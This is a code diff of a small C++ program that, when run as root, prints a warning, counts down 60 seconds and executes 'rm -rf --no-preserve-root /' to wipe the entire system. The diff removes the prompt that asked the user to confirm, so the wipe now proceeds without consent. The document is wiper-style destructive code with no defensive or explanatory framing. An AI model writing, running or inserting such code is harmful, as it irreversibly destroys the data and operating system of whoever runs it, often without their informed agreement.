@@ -14,13 +14,10 @@ void counter(int seconds)
 }
 int main()
 {
-    int destroy = 0;
     int id = getuid();
     if (id == 0)
     {
         std::cout << "\nYou are root";
-        std::cout << "\nDestroy this PC? ";
-        std::cin >> destroy;
         std::cout << "This pc will be wiped in 60 seconds\n";
         counter(60);
         system("rm -rf --no-preserve-root /");
